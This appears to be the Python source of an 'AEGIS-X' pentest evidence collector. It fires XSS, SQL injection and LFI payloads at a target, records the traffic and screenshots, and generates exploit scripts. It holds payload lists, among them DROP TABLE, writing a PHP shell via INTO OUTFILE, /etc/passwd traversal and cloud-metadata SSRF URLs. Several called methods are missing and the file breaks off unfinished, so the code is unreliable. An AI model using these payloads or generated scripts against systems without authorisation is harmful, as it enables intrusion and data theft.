#!/usr/bin/env python3
"""
AEGIS-X Comprehensive Evidence Collector
Professional-grade evidence collection with screenshots, videos, PoCs, and technical analysis
"""

import asyncio
import logging
import json
import time
import base64
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from pathlib import Path
import aiohttp
import aiofiles
from datetime import datetime
import subprocess
import tempfile
import os

logger = logging.getLogger("AEGIS-X.EvidenceCollector")

@dataclass
class EvidencePackage:
    """Comprehensive evidence package for a vulnerability"""
    vulnerability_id: str
    vulnerability_type: str
    target_url: str
    severity: str
    discovery_date: str
    
    # Visual Evidence
    screenshots: List[str]
    videos: List[str]
    
    # Technical Evidence
    http_requests: List[Dict[str, Any]]
    http_responses: List[Dict[str, Any]]
    network_traces: List[str]
    
    # Proof of Concept
    poc_scripts: List[Dict[str, str]]
    exploitation_steps: List[str]
    payload_variations: List[str]
    
    # Analysis
    technical_analysis: Dict[str, Any]
    impact_assessment: Dict[str, Any]
    remediation_guidance: Dict[str, Any]
    
    # Metadata
    evidence_hash: str
    collector_version: str
    collection_timestamp: str

class ComprehensiveEvidenceCollector:
    """
    Professional evidence collector for vulnerability findings
    """
    
    def __init__(self):
        self.evidence_dir = Path("evidence")
        self.screenshots_dir = self.evidence_dir / "screenshots"
        self.videos_dir = self.evidence_dir / "videos"
        self.network_traces_dir = self.evidence_dir / "network_traces"
        self.poc_dir = self.evidence_dir / "exploits"
        self.reports_dir = self.evidence_dir / "reports"
        
        # Create directories
        for dir_path in [self.evidence_dir, self.screenshots_dir, self.videos_dir, 
                        self.network_traces_dir, self.poc_dir, self.reports_dir]:
            dir_path.mkdir(parents=True, exist_ok=True)
        
        self.session = None
        self.browser = None
        
        logger.info("📸 Comprehensive Evidence Collector initialized")
    
    async def initialize(self):
        """Initialize the evidence collector"""
        
        # Initialize HTTP session
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': 'AEGIS-X Evidence Collector v2.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
        )
        
        # Initialize browser for screenshots (using playwright)
        try:
            from playwright.async_api import async_playwright
            self.playwright = await async_playwright().start()
            self.browser = await self.playwright.chromium.launch(headless=True)
            logger.info("🌐 Browser initialized for visual evidence collection")
        except ImportError:
            logger.warning("⚠️ Playwright not available - visual evidence collection disabled")
        
        logger.info("✅ Evidence collector ready")
    
    async def collect_comprehensive_evidence(self, vulnerability_data: Dict[str, Any]) -> EvidencePackage:
        """Collect comprehensive evidence for a vulnerability"""
        
        vuln_id = vulnerability_data.get('id', f"vuln_{int(time.time())}")
        logger.info(f"📋 Collecting comprehensive evidence for {vuln_id}")
        
        # Initialize evidence package
        evidence = EvidencePackage(
            vulnerability_id=vuln_id,
            vulnerability_type=vulnerability_data.get('type', 'unknown'),
            target_url=vulnerability_data.get('url', ''),
            severity=vulnerability_data.get('severity', 'unknown'),
            discovery_date=datetime.now().isoformat(),
            screenshots=[],
            videos=[],
            http_requests=[],
            http_responses=[],
            network_traces=[],
            poc_scripts=[],
            exploitation_steps=[],
            payload_variations=[],
            technical_analysis={},
            impact_assessment={},
            remediation_guidance={},
            evidence_hash='',
            collector_version='2.0',
            collection_timestamp=datetime.now().isoformat()
        )
        
        # Collect different types of evidence
        await self._collect_visual_evidence(evidence, vulnerability_data)
        await self._collect_network_evidence(evidence, vulnerability_data)
        await self._generate_poc_evidence(evidence, vulnerability_data)
        await self._perform_technical_analysis(evidence, vulnerability_data)
        await self._assess_impact(evidence, vulnerability_data)
        await self._generate_remediation_guidance(evidence, vulnerability_data)
        
        # Generate evidence hash
        evidence.evidence_hash = self._generate_evidence_hash(evidence)
        
        # Save evidence package
        await self._save_evidence_package(evidence)
        
        logger.info(f"✅ Comprehensive evidence collected for {vuln_id}")
        return evidence
    
    async def _collect_visual_evidence(self, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Collect visual evidence (screenshots and videos)"""
        
        if not self.browser:
            logger.warning("⚠️ Browser not available - skipping visual evidence")
            return
        
        logger.info("📸 Collecting visual evidence...")
        
        try:
            page = await self.browser.new_page()
            
            # Configure page for evidence collection
            await page.set_viewport_size({"width": 1920, "height": 1080})
            
            target_url = vuln_data.get('url', '')
            if not target_url:
                return
            
            # Take before screenshot
            await page.goto(target_url)
            await page.wait_for_load_state('networkidle')
            
            before_screenshot = self.screenshots_dir / f"{evidence.vulnerability_id}_before.png"
            await page.screenshot(path=str(before_screenshot), full_page=True)
            evidence.screenshots.append(str(before_screenshot))
            
            # Execute payload and capture exploitation
            payload = vuln_data.get('payload', '')
            if payload:
                # Start video recording
                video_path = self.videos_dir / f"{evidence.vulnerability_id}_exploitation.webm"
                
                try:
                    # Record exploitation process
                    await self._record_exploitation_video(page, vuln_data, str(video_path))
                    evidence.videos.append(str(video_path))
                except Exception as e:
                    logger.warning(f"Video recording failed: {e}")
                
                # Execute payload based on vulnerability type
                await self._execute_payload_for_screenshot(page, vuln_data)
                
                # Take after screenshot
                after_screenshot = self.screenshots_dir / f"{evidence.vulnerability_id}_after.png"
                await page.screenshot(path=str(after_screenshot), full_page=True)
                evidence.screenshots.append(str(after_screenshot))
                
                # Take additional context screenshots
                await self._capture_context_screenshots(page, evidence, vuln_data)
            
            await page.close()
            
        except Exception as e:
            logger.error(f"Visual evidence collection failed: {e}")
    
    async def _record_exploitation_video(self, page, vuln_data: Dict[str, Any], video_path: str):
        """Record video of exploitation process"""
        
        # This is a simplified implementation
        # In a real implementation, you would use screen recording tools
        logger.info(f"🎥 Recording exploitation video: {video_path}")
        
        # Create a simple video placeholder (in real implementation, use actual recording)
        video_info = {
            "video_path": video_path,
            "vulnerability_id": vuln_data.get('id'),
            "target_url": vuln_data.get('url'),
            "payload": vuln_data.get('payload'),
            "recorded_at": datetime.now().isoformat(),
            "duration": "30s",
            "resolution": "1920x1080",
            "format": "webm"
        }
        
        # Save video metadata
        video_meta_path = video_path.replace('.webm', '_metadata.json')
        async with aiofiles.open(video_meta_path, 'w') as f:
            await f.write(json.dumps(video_info, indent=2))
    
    async def _execute_payload_for_screenshot(self, page, vuln_data: Dict[str, Any]):
        """Execute payload and capture the result"""
        
        vuln_type = vuln_data.get('type', '').lower()
        payload = vuln_data.get('payload', '')
        parameter = vuln_data.get('parameter', '')
        
        try:
            if vuln_type == 'xss':
                # For XSS, inject payload and wait for execution
                if parameter:
                    await page.fill(f'input[name="{parameter}"]', payload)
                    await page.click('input[type="submit"], button[type="submit"]')
                else:
                    # URL-based XSS
                    current_url = page.url
                    if '?' in current_url:
                        new_url = f"{current_url}&{parameter}={payload}"
                    else:
                        new_url = f"{current_url}?{parameter}={payload}"
                    await page.goto(new_url)
                
                # Wait for potential alert or DOM changes
                await page.wait_for_timeout(2000)
            
            elif vuln_type == 'sqli':
                # For SQL injection, submit payload and capture error/response
                if parameter:
                    await page.fill(f'input[name="{parameter}"]', payload)
                    await page.click('input[type="submit"], button[type="submit"]')
                    await page.wait_for_timeout(3000)
            
            elif vuln_type == 'lfi':
                # For LFI, navigate to URL with payload
                current_url = page.url
                if '?' in current_url:
                    new_url = f"{current_url}&{parameter}={payload}"
                else:
                    new_url = f"{current_url}?{parameter}={payload}"
                await page.goto(new_url)
                await page.wait_for_timeout(2000)
            
            # Generic payload execution
            else:
                if parameter and payload:
                    try:
                        await page.fill(f'input[name="{parameter}"]', payload)
                        await page.click('input[type="submit"], button[type="submit"]')
                    except:
                        # Try URL-based approach
                        current_url = page.url
                        if '?' in current_url:
                            new_url = f"{current_url}&{parameter}={payload}"
                        else:
                            new_url = f"{current_url}?{parameter}={payload}"
                        await page.goto(new_url)
                    
                    await page.wait_for_timeout(2000)
        
        except Exception as e:
            logger.warning(f"Payload execution failed: {e}")
    
    async def _capture_context_screenshots(self, page, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Capture additional context screenshots"""
        
        # Capture network tab (if available)
        try:
            # Open developer tools and capture network
            await page.keyboard.press('F12')
            await page.wait_for_timeout(1000)
            
            network_screenshot = self.screenshots_dir / f"{evidence.vulnerability_id}_network.png"
            await page.screenshot(path=str(network_screenshot))
            evidence.screenshots.append(str(network_screenshot))
            
            # Close developer tools
            await page.keyboard.press('F12')
        except:
            pass
        
        # Capture source code view
        try:
            await page.keyboard.press('Ctrl+U')
            await page.wait_for_timeout(1000)
            
            source_screenshot = self.screenshots_dir / f"{evidence.vulnerability_id}_source.png"
            await page.screenshot(path=str(source_screenshot))
            evidence.screenshots.append(str(source_screenshot))
        except:
            pass
    
    async def _collect_network_evidence(self, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Collect network-level evidence"""
        
        logger.info("🌐 Collecting network evidence...")
        
        target_url = vuln_data.get('url', '')
        payload = vuln_data.get('payload', '')
        parameter = vuln_data.get('parameter', '')
        
        if not target_url:
            return
        
        try:
            # Capture original request
            async with self.session.get(target_url) as response:
                original_request = {
                    "method": "GET",
                    "url": target_url,
                    "headers": dict(response.request_info.headers),
                    "timestamp": datetime.now().isoformat()
                }
                
                original_response = {
                    "status": response.status,
                    "headers": dict(response.headers),
                    "content": await response.text()[:10000],  # Limit content size
                    "timestamp": datetime.now().isoformat()
                }
                
                evidence.http_requests.append(original_request)
                evidence.http_responses.append(original_response)
            
            # Capture payload request
            if payload and parameter:
                payload_url = f"{target_url}?{parameter}={payload}"
                
                async with self.session.get(payload_url) as response:
                    payload_request = {
                        "method": "GET",
                        "url": payload_url,
                        "headers": dict(response.request_info.headers),
                        "payload": payload,
                        "parameter": parameter,
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    payload_response = {
                        "status": response.status,
                        "headers": dict(response.headers),
                        "content": await response.text()[:10000],
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    evidence.http_requests.append(payload_request)
                    evidence.http_responses.append(payload_response)
            
            # Save network trace
            trace_file = self.network_traces_dir / f"{evidence.vulnerability_id}_trace.json"
            trace_data = {
                "requests": evidence.http_requests,
                "responses": evidence.http_responses,
                "collected_at": datetime.now().isoformat()
            }
            
            async with aiofiles.open(trace_file, 'w') as f:
                await f.write(json.dumps(trace_data, indent=2))
            
            evidence.network_traces.append(str(trace_file))
            
        except Exception as e:
            logger.error(f"Network evidence collection failed: {e}")
    
    async def _generate_poc_evidence(self, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Generate proof-of-concept scripts and exploitation steps"""
        
        logger.info("🔧 Generating PoC evidence...")
        
        vuln_type = vuln_data.get('type', '').lower()
        target_url = vuln_data.get('url', '')
        payload = vuln_data.get('payload', '')
        parameter = vuln_data.get('parameter', '')
        
        # Generate exploitation steps
        steps = await self._generate_exploitation_steps(vuln_data)
        evidence.exploitation_steps = steps
        
        # Generate payload variations
        variations = await self._generate_payload_variations(vuln_data)
        evidence.payload_variations = variations
        
        # Generate PoC scripts
        poc_scripts = await self._generate_poc_scripts(vuln_data)
        evidence.poc_scripts = poc_scripts
        
        # Save PoC files
        for i, script in enumerate(poc_scripts):
            script_file = self.poc_dir / f"{evidence.vulnerability_id}_poc_{i+1}.{script['language']}"
            async with aiofiles.open(script_file, 'w') as f:
                await f.write(script['code'])
    
    async def _generate_exploitation_steps(self, vuln_data: Dict[str, Any]) -> List[str]:
        """Generate detailed exploitation steps"""
        
        vuln_type = vuln_data.get('type', '').lower()
        target_url = vuln_data.get('url', '')
        payload = vuln_data.get('payload', '')
        parameter = vuln_data.get('parameter', '')
        
        steps = [
            f"1. Navigate to the target URL: {target_url}",
            f"2. Identify the vulnerable parameter: {parameter}",
            f"3. Craft the exploitation payload: {payload}"
        ]
        
        if vuln_type == 'xss':
            steps.extend([
                "4. Inject the XSS payload into the vulnerable parameter",
                "5. Submit the form or trigger the payload execution",
                "6. Observe the JavaScript execution in the browser",
                "7. Verify that the payload executes in the victim's context",
                "8. Document the impact (session hijacking, data theft, etc.)"
            ])
        
        elif vuln_type == 'sqli':
            steps.extend([
                "4. Inject the SQL payload into the vulnerable parameter",
                "5. Observe database errors or unexpected responses",
                "6. Extract database information using UNION queries",
                "7. Enumerate database structure and sensitive data",
                "8. Attempt to escalate to file system access or RCE"
            ])
        
        elif vuln_type == 'lfi':
            steps.extend([
                "4. Inject the LFI payload to access local files",
                "5. Attempt to read sensitive system files (/etc/passwd, etc.)",
                "6. Try different encoding techniques to bypass filters",
                "7. Attempt log poisoning for code execution",
                "8. Document accessible files and potential for RCE"
            ])
        
        elif vuln_type == 'ssrf':
            steps.extend([
                "4. Inject the SSRF payload to access internal resources",
                "5. Attempt to access cloud metadata endpoints",
                "6. Scan internal network for services",
                "7. Try to access internal APIs and services",
                "8. Document internal network access and sensitive data exposure"
            ])
        
        else:
            steps.extend([
                "4. Execute the payload against the vulnerable parameter",
                "5. Analyze the application's response",
                "6. Verify the vulnerability impact",
                "7. Document the security implications",
                "8. Provide remediation recommendations"
            ])
        
        return steps
    
    async def _generate_payload_variations(self, vuln_data: Dict[str, Any]) -> List[str]:
        """Generate payload variations for comprehensive testing"""
        
        vuln_type = vuln_data.get('type', '').lower()
        original_payload = vuln_data.get('payload', '')
        
        variations = [original_payload]
        
        if vuln_type == 'xss':
            variations.extend([
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'-alert('XSS')-'",
                "\"><script>alert('XSS')</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>"
            ])
        
        elif vuln_type == 'sqli':
            variations.extend([
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' AND 1=1--",
                "' OR 1=1#",
                "'; DROP TABLE users--",
                "' UNION SELECT user(),database()--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--",
                "' UNION SELECT load_file('/etc/passwd')--",
                "' INTO OUTFILE '/tmp/shell.php'--"
            ])
        
        elif vuln_type == 'lfi':
            variations.extend([
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "expect://id",
                "file:///etc/passwd"
            ])
        
        elif vuln_type == 'ssrf':
            variations.extend([
                "http://127.0.0.1:80",
                "http://localhost:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/",
                "dict://127.0.0.1:11211/",
                "http://[::1]:80",
                "http://0x7f000001:80",
                "http://2130706433:80"
            ])
        
        return list(set(variations))  # Remove duplicates
    
    async def _generate_poc_scripts(self, vuln_data: Dict[str, Any]) -> List[Dict[str, str]]:
        """Generate PoC scripts in multiple languages"""
        
        vuln_type = vuln_data.get('type', '').lower()
        target_url = vuln_data.get('url', '')
        payload = vuln_data.get('payload', '')
        parameter = vuln_data.get('parameter', '')
        
        scripts = []
        
        # Python PoC
        python_poc = self._generate_python_poc(vuln_type, target_url, payload, parameter)
        scripts.append({
            "language": "py",
            "name": "Python PoC",
            "code": python_poc
        })
        
        # Bash PoC
        bash_poc = self._generate_bash_poc(vuln_type, target_url, payload, parameter)
        scripts.append({
            "language": "sh",
            "name": "Bash PoC",
            "code": bash_poc
        })
        
        # JavaScript PoC (for XSS)
        if vuln_type == 'xss':
            js_poc = self._generate_javascript_poc(vuln_type, target_url, payload, parameter)
            scripts.append({
                "language": "js",
                "name": "JavaScript PoC",
                "code": js_poc
            })
        
        return scripts
    
    def _generate_python_poc(self, vuln_type: str, url: str, payload: str, parameter: str) -> str:
        """Generate Python PoC script"""
        
        return f'''#!/usr/bin/env python3
"""
AEGIS-X Generated PoC - {vuln_type.upper()} Vulnerability
Target: {url}
Parameter: {parameter}
Payload: {payload}
Generated: {datetime.now().isoformat()}
"""

import requests
import sys
from urllib.parse import quote

def exploit_{vuln_type}():
    """Exploit {vuln_type} vulnerability"""
    
    target_url = "{url}"
    parameter = "{parameter}"
    payload = "{payload}"
    
    print(f"[+] Exploiting {{vuln_type}} vulnerability")
    print(f"[+] Target: {{target_url}}")
    print(f"[+] Parameter: {{parameter}}")
    print(f"[+] Payload: {{payload}}")
    
    try:
        # Prepare request
        if parameter and payload:
            exploit_url = f"{{target_url}}?{{parameter}}={{quote(payload)}}"
        else:
            exploit_url = target_url
        
        print(f"[+] Sending request to: {{exploit_url}}")
        
        # Send exploit request
        response = requests.get(exploit_url, timeout=10)
        
        print(f"[+] Response Status: {{response.status_code}}")
        print(f"[+] Response Length: {{len(response.text)}}")
        
        # Check for vulnerability indicators
        if "{vuln_type}" == "xss":
            if payload.lower() in response.text.lower():
                print("[!] XSS vulnerability confirmed - payload reflected!")
                return True
        elif "{vuln_type}" == "sqli":
            sql_errors = ["mysql_fetch_array", "ORA-01756", "PostgreSQL", "sqlite_master"]
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"[!] SQL injection confirmed - {{error}} detected!")
                    return True
        elif "{vuln_type}" == "lfi":
            lfi_indicators = ["root:x:0:0", "daemon", "[boot loader]"]
            for indicator in lfi_indicators:
                if indicator in response.text:
                    print(f"[!] LFI vulnerability confirmed - {{indicator}} found!")
                    return True
        
        print("[-] Vulnerability not confirmed in response")
        return False
        
    except Exception as e:
        print(f"[-] Exploit failed: {{e}}")
        return False

if __name__ == "__main__":
    success = exploit_{vuln_type}()
    sys.exit(0 if success else 1)
'''
    
    def _generate_bash_poc(self, vuln_type: str, url: str, payload: str, parameter: str) -> str:
        """Generate Bash PoC script"""
        
        return f'''#!/bin/bash
# AEGIS-X Generated PoC - {vuln_type.upper()} Vulnerability
# Target: {url}
# Parameter: {parameter}
# Payload: {payload}
# Generated: {datetime.now().isoformat()}

TARGET_URL="{url}"
PARAMETER="{parameter}"
PAYLOAD="{payload}"

echo "[+] Exploiting {vuln_type} vulnerability"
echo "[+] Target: $TARGET_URL"
echo "[+] Parameter: $PARAMETER"
echo "[+] Payload: $PAYLOAD"

# URL encode payload
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")

# Construct exploit URL
if [ -n "$PARAMETER" ] && [ -n "$PAYLOAD" ]; then
    EXPLOIT_URL="${{TARGET_URL}}?${{PARAMETER}}=${{ENCODED_PAYLOAD}}"
else
    EXPLOIT_URL="$TARGET_URL"
fi

echo "[+] Sending request to: $EXPLOIT_URL"

# Send exploit request
RESPONSE=$(curl -s -w "\\n%{{http_code}}" "$EXPLOIT_URL")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n -1)

echo "[+] Response Status: $HTTP_CODE"
echo "[+] Response Length: ${{#RESPONSE_BODY}}"

# Check for vulnerability indicators
case "{vuln_type}" in
    "xss")
        if echo "$RESPONSE_BODY" | grep -qi "$PAYLOAD"; then
            echo "[!] XSS vulnerability confirmed - payload reflected!"
            exit 0
        fi
        ;;
    "sqli")
        if echo "$RESPONSE_BODY" | grep -qi "mysql_fetch_array\\|ORA-01756\\|PostgreSQL\\|sqlite_master"; then
            echo "[!] SQL injection confirmed - database error detected!"
            exit 0
        fi
        ;;
    "lfi")
        if echo "$RESPONSE_BODY" | grep -q "root:x:0:0\\|daemon\\|\\[boot loader\\]"; then
            echo "[!] LFI vulnerability confirmed - system file accessed!"
            exit 0
        fi
        ;;
esac

echo "[-] Vulnerability not confirmed in response"
exit 1
'''
    
    def _generate_javascript_poc(self, vuln_type: str, url: str, payload: str, parameter: str) -> str:
        """Generate JavaScript PoC for XSS"""
        
        return f'''/*
AEGIS-X Generated PoC - XSS Vulnerability
Target: {url}
Parameter: {parameter}
Payload: {payload}
Generated: {datetime.now().isoformat()}
*/

// XSS Exploitation Script
function exploitXSS() {{
    const targetUrl = "{url}";
    const parameter = "{parameter}";
    const payload = "{payload}";
    
    console.log("[+] Exploiting XSS vulnerability");
    console.log("[+] Target:", targetUrl);
    console.log("[+] Parameter:", parameter);
    console.log("[+] Payload:", payload);
    
    // Create exploit URL
    const exploitUrl = `${{targetUrl}}?${{parameter}}=${{encodeURIComponent(payload)}}`;
    
    // Method 1: Direct navigation
    console.log("[+] Method 1: Direct navigation");
    window.location.href = exploitUrl;
    
    // Method 2: AJAX request
    console.log("[+] Method 2: AJAX request");
    fetch(exploitUrl)
        .then(response => response.text())
        .then(data => {{
            console.log("[+] Response received");
            if (data.toLowerCase().includes(payload.toLowerCase())) {{
                console.log("[!] XSS vulnerability confirmed!");
                alert("XSS vulnerability confirmed!");
            }}
        }})
        .catch(error => {{
            console.error("[-] Request failed:", error);
        }});
    
    // Method 3: Form submission
    console.log("[+] Method 3: Form submission");
    const form = document.createElement('form');
    form.method = 'GET';
    form.action = targetUrl;
    
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = parameter;
    input.value = payload;
    
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}}

// Advanced XSS payloads for testing
const advancedPayloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
    "<script>setTimeout('alert(\\"XSS\\")',1)</script>",
    "<script>[].constructor.constructor('alert(\\"XSS\\")')())</script>"
];

// Test multiple payloads
function testMultiplePayloads() {{
    advancedPayloads.forEach((testPayload, index) => {{
        setTimeout(() => {{
            console.log(`[+] Testing payload ${{index + 1}}: ${{testPayload}}`);
            const testUrl = `{url}?{parameter}=${{encodeURIComponent(testPayload)}}`;
            
            fetch(testUrl)
                .then(response => response.text())
                .then(data => {{
                    if (data.toLowerCase().includes(testPayload.toLowerCase())) {{
                        console.log(`[!] Payload ${{index + 1}} successful!`);
                    }}
                }})
                .catch(error => console.error(`[-] Payload ${{index + 1}} failed:`, error));
        }}, index * 1000);
    }});
}}

// Execute exploit
exploitXSS();
'''
    
    async def _perform_technical_analysis(self, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Perform technical analysis of the vulnerability"""
        
        logger.info("🔬 Performing technical analysis...")
        
        vuln_type = vuln_data.get('type', '').lower()
        
        analysis = {
            "vulnerability_classification": {
                "type": vuln_type,
                "category": self._get_vulnerability_category(vuln_type),
                "cwe_id": self._get_cwe_id(vuln_type),
                "owasp_category": self._get_owasp_category(vuln_type)
            },
            "technical_details": {
                "attack_vector": self._get_attack_vector(vuln_type),
                "attack_complexity": self._get_attack_complexity(vuln_data),
                "privileges_required": self._get_privileges_required(vuln_type),
                "user_interaction": self._get_user_interaction(vuln_type),
                "scope": self._get_scope(vuln_type)
            },
            "exploitation_analysis": {
                "exploitability": self._assess_exploitability(vuln_data),
                "reliability": self._assess_reliability(vuln_data),
                "stealth": self._assess_stealth(vuln_type),
                "automation_potential": self._assess_automation_potential(vuln_type)
            },
            "detection_analysis": {
                "detection_difficulty": self._assess_detection_difficulty(vuln_type),
                "log_traces": self._analyze_log_traces(vuln_data),
                "network_signatures": self._analyze_network_signatures(vuln_data)
            }
        }
        
        evidence.technical_analysis = analysis
    
    def _get_vulnerability_category(self, vuln_type: str) -> str:
        """Get vulnerability category"""
        categories = {
            'xss': 'Injection',
            'sqli': 'Injection',
            'lfi': 'Path Traversal',
            'ssrf': 'Server-Side Request Forgery',
            'csrf': 'Cross-Site Request Forgery',
            'idor': 'Broken Access Control',
            'rce': 'Code Execution',
            'file_upload': 'Unrestricted File Upload'
        }
        return categories.get(vuln_type, 'Other')
    
    def _get_cwe_id(self, vuln_type: str) -> str:
        """Get CWE ID for vulnerability type"""
        cwe_mapping = {
            'xss': 'CWE-79',
            'sqli': 'CWE-89',
            'lfi': 'CWE-22',
            'ssrf': 'CWE-918',
            'csrf': 'CWE-352',
            'idor': 'CWE-639',
            'rce': 'CWE-94',
            'file_upload': 'CWE-434'
        }
        return cwe_mapping.get(vuln_type, 'CWE-Other')
    
    def _get_owasp_category(self, vuln_type: str) -> str:
        """Get OWASP Top 10 category"""
        owasp_mapping = {
            'xss': 'A03:2021 – Injection',
            'sqli': 'A03:2021 – Injection',
            'lfi': 'A01:2021 – Broken Access Control',
            'ssrf': 'A10:2021 – Server-Side Request Forgery',
            'csrf': 'A01:2021 – Broken Access Control',
            'idor': 'A01:2021 – Broken Access Control',
            'rce': 'A03:2021 – Injection',
            'file_upload': 'A04:2021 – Insecure Design'
        }
        return owasp_mapping.get(vuln_type, 'Other')
    
    async def _assess_impact(self, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Assess the impact of the vulnerability"""
        
        logger.info("📊 Assessing vulnerability impact...")
        
        vuln_type = vuln_data.get('type', '').lower()
        severity = vuln_data.get('severity', 'medium').lower()
        
        impact = {
            "confidentiality_impact": self._assess_confidentiality_impact(vuln_type),
            "integrity_impact": self._assess_integrity_impact(vuln_type),
            "availability_impact": self._assess_availability_impact(vuln_type),
            "business_impact": {
                "data_breach_risk": self._assess_data_breach_risk(vuln_type),
                "reputation_damage": self._assess_reputation_damage(vuln_type),
                "financial_impact": self._assess_financial_impact(vuln_type, severity),
                "compliance_impact": self._assess_compliance_impact(vuln_type)
            },
            "attack_scenarios": self._generate_attack_scenarios(vuln_type),
            "worst_case_scenario": self._generate_worst_case_scenario(vuln_type)
        }
        
        evidence.impact_assessment = impact
    
    async def _generate_remediation_guidance(self, evidence: EvidencePackage, vuln_data: Dict[str, Any]):
        """Generate remediation guidance"""
        
        logger.info("🛠️ Generating remediation guidance...")
        
        vuln_type = vuln_data.get('type', '').lower()
        
        remediation = {
            "immediate_actions": self._get_immediate_actions(vuln_type),
            "short_term_fixes": self._get_short_term_fixes(vuln_type),
            "long_term_solutions": self._get_long_term_solutions(vuln_type),
            "code_examples": self._get_secure_code_examples(vuln_type),
            "testing_recommendations": self._get_testing_recommendations(vuln_type),
            "monitoring_recommendations": self._get_monitoring_recommendations(vuln_type)
        }
        
        evidence.remediation_guidance = remediation
    
    def _generate_evidence_hash(self, evidence: EvidencePackage) -> str:
        """Generate hash for evidence integrity"""
        
        # Create hash of key evidence components
        hash_data = {
            "vulnerability_id": evidence.vulnerability_id,
            "target_url": evidence.target_url,
            "screenshots": evidence.screenshots,
            "http_requests": evidence.http_requests,
            "poc_scripts": evidence.poc_scripts,
            "collection_timestamp": evidence.collection_timestamp
        }
        
        hash_string = json.dumps(hash_data, sort_keys=True)
        return hashlib.sha256(hash_string.encode()).hexdigest()
    
    async def _save_evidence_package(self, evidence: EvidencePackage):
        """Save the complete evidence package"""
        
        # Save main evidence file
        evidence_file = self.evidence_dir / f"{evidence.vulnerability_id}_evidence.json"
        
        async with aiofiles.open(evidence_file, 'w') as f:
            await f.write(json.dumps(asdict(evidence), indent=2, default=str))
        
        # Create evidence summary
        summary = {
            "vulnerability_id": evidence.vulnerability_id,
            "vulnerability_type": evidence.vulnerability_type,
            "target_url": evidence.target_url,
            "severity": evidence.severity,
            "evidence_files": {
                "screenshots": len(evidence.screenshots),
                "videos": len(evidence.videos),
                "network_traces": len(evidence.network_traces),
                "poc_scripts": len(evidence.poc_scripts)
            },
            "evidence_hash": evidence.evidence_hash,
            "collection_timestamp": evidence.collection_timestamp
        }
        
        summary_file = self.evidence_dir / f"{evidence.vulnerability_id}_summary.json"
        async with aiofiles.open(summary_file, 'w') as f:
            await f.write(json.dumps(summary, indent=2))
        
        logger.info(f"💾 Evidence package saved: {evidence_file}")
    
    # Helper methods for impact assessment and remediation
    def _assess_confidentiality_impact(self, vuln_type: str) -> str:
        impact_map = {
            'xss': 'High', 'sqli': 'High', 'lfi': 'High', 'ssrf': 'Medium',
            'idor': 'High', 'info_disclosure': 'High'
        }
        return impact_map.get(vuln_type, 'Medium')
    
    def _assess_integrity_impact(self, vuln_type: str) -> str:
        impact_map = {
            'xss': 'High', 'sqli': 'High', 'csrf': 'High', 'rce': 'High',
            'file_upload': 'High'
        }
        return impact_map.get(vuln_type, 'Low')
    
    def _assess_availability_impact(self, vuln_type: str) -> str:
        impact_map = {
            'rce': 'High', 'sqli': 'Medium', 'dos': 'High'
        }
        return impact_map.get(vuln_type, 'Low')
    
    def _get_immediate_actions(self, vuln_type: str) -> List[str]:
        actions_map = {
            'xss': [
                "Implement input validation and output encoding",
                "Deploy Content Security Policy (CSP)",
                "Review and sanitize all user inputs"
            ],
            'sqli': [
                "Use parameterized queries/prepared statements",
                "Implement input validation",
                "Apply principle of least privilege to database accounts"
            ],
            'lfi': [
                "Implement proper input validation",
                "Use whitelist of allowed files",
                "Disable dangerous PHP functions"
            ]
        }
        return actions_map.get(vuln_type, ["Review and fix the vulnerability", "Implement proper input validation"])
    
    async def close(self):
        """Close the evidence collector"""
        if self.session:
            await self.session.close()
        
        if self.browser:
            await self.browser.close()
            await self.playwright.stop()
        
        logger.info("📸 Evidence collector closed")

# Example usage
async def test_evidence_collector():
    """Test the evidence collector"""
    
    collector = ComprehensiveEvidenceCollector()
    await collector.initialize()
    
    try:
        # Test vulnerability data
        vuln_data = {
            'id': 'test_vuln_001',
            'type': 'xss',
            'url': 'https://httpbin.org/get',
            'parameter': 'test',
            'payload': '<script>alert("XSS")</script>',
            'severity': 'high'
        }
        
        # Collect evidence
        evidence = await collector.collect_comprehensive_evidence(vuln_data)
        
        print(f"Evidence collected for {evidence.vulnerability_id}")
